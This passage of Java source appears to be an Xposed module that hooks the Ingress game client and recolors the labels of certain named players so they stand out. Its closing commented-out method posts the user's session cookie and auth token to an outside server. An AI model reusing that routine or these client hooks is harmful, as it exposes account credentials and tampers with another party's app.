                    Class<?> hookedClass = param.thisObject.getClass();
                    if (hookedClass.equals(Table) || hookedClass.equals(Image) || hookedClass.equals(ajt)) {
                        return;
                    }
                    if (hookedClass.equals(aju)) {
                        String label = getObjectField(param.thisObject, "ʾ").toString();
                        if (label.equals("5391fb18942c45e6b3f7a37e53f82fc9.c")) {
                            logger.debugLog("REPLACED setColorF for `" + label + "` " + hookedClass.toString() + ", color: " + param.args[0].toString() + ", " + param.args[1].toString() + ", " + param.args[2].toString() + ", " + param.args[3].toString() + ".");
                            incrementMethodDepth(depthKey);
                            callMethod(param.thisObject, "setColor", 1.0f, 0.0f, 0.0f, 1.0f);
                            decrementMethodDepth(depthKey);

                            param.setResult(null);

                            return;
                        }

                        if (label.equals("7bd4c796baf14b65a354f0ca2004e631.c")) {
                            logger.debugLog("REPLACED setColorF for `" + label + "` " + hookedClass.toString());
                            incrementMethodDepth(depthKey);
                            callMethod(param.thisObject, "setColor", 1.0f, 1.0f, 0.0f, 1.0f);
                            decrementMethodDepth(depthKey);

                            param.setResult(null);

                            return;
                        }
                        logger.debugLog("HOOKED setColor `" + label + "` in " + hookedClass);

                        return;
                    }
                    if (hookedClass.equals(akq)) {
                        String label = (String)getObjectField(param.thisObject, "ʿ");
                        if (label != null && (label.equals("5391fb18942c45e6b3f7a37e53f82fc9.c") || label.equals("alexbilevskiy"))) {
                            logger.debugLog("REPLACED setColorF for `" + label + "` " + hookedClass.toString()  + ", color: " + param.args[0].toString() + ", " + param.args[1].toString() + ", " + param.args[2].toString() + ", " + param.args[3].toString() + ".");
                            incrementMethodDepth(depthKey);
                            callMethod(param.thisObject, "setColor", 1.0f, 0.0f, 0.0f, 1.0f);
                            decrementMethodDepth(depthKey);

                            param.setResult(null);

                            return;
                        }
                        if (label != null && (label.equals("7bd4c796baf14b65a354f0ca2004e631.c") || label.equals("vl309"))) {
                            logger.debugLog("REPLACED setColorF for `" + label + "` " + hookedClass.toString());
                            incrementMethodDepth(depthKey);
                            callMethod(param.thisObject, "setColor", 1.0f, 1.0f, 0.0f, 1.0f);
                            decrementMethodDepth(depthKey);

                            param.setResult(null);

                            return;
                        }
                        logger.debugLog("HOOKED setColorF `" + label + "` in " + hookedClass);

                        return;
                    }

                    if (hookedClass.equals(NativeLabel)) {
                        //String label = getObjectField(param.thisObject, "ᐝ").toString();
                        //logger.log("hooked setColorF for `" + label + "` " + hookedClass.toString());

                        return;
                    }
                    //logger.log("NOT-HOOKED setColorF for `" + hookedClass.toString() + "`");
                }
            });


        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        //map requests
        try {
//            final Class<?> mx = findClass("o.mx", lpparam.classLoader);
//            //final Class<?> le = findClass("o.le", lpparam.classLoader);
//            final Class<?> httpGet = findClass("org.apache.http.client.methods.HttpGet", lpparam.classLoader);
//            hookAllMethods(mx, true, true, true);
//            //hookAllMethods(le, true, true, true);
//            findAndHookConstructor(httpGet, String.class, new XC_MethodHook() {
//                @Override
//                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                    logger.log("HOOKED HTTP GET `" + param.args[0].toString() + "` in " + param.getClass().toString());
//                }
//            });
            //var_dump(base64_encode(hex2bin(sha1(sha1('resonator') . '/2/17/79268/40873'))));

            //\ufb52.if
//            final Class<?> ufb52Sif = findClass("o.ﭒ$if", lpparam.classLoader);
//            findAndHookMethod(ufb52Sif, "ˊ", byte[].class, new XC_MethodHook() {
//                @Override
//                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                    byte[] p = (byte [])param.args[0];
//                    String s = new String(p);
//                    logger.log("HOOKED BYTE: `" + s + "`");
//                }
//            });

        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

    }

    static private String cachedCookie, cachedToken;

/*
    private void reportAuth(String cookie, String token) throws UnsupportedEncodingException, JSONException {
        if (cachedCookie != null && cachedToken != null) {
            if (cachedCookie.equals(cookie) && cachedToken.equals(token)) {
                logger.debugLog("auth: already sent");

                return;
            }
        }
        HttpClient client = new DefaultHttpClient();
        HttpPost fakeRequest = new HttpPost("http://iusq.tk/i/ing-auth.php");
        List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
        urlParameters.add(new BasicNameValuePair("user", "appleblo0m"));
        urlParameters.add(new BasicNameValuePair("cookie", cookie));
        urlParameters.add(new BasicNameValuePair("token", token));

        fakeRequest.setEntity(new UrlEncodedFormEntity(urlParameters));
        logger.debugLog("auth: reporting...");
        try {
            HttpResponse fakeResponse = client.execute(fakeRequest);
            fakeResponse.getEntity().getContent().close();
        } catch (Throwable e) {
            logger.log("auth: report ERROR: " + e.getClass().toString() + ", " + e.getMessage());

            return;
        }
        cachedCookie = cookie;
        cachedToken = token;
    }
*/
}
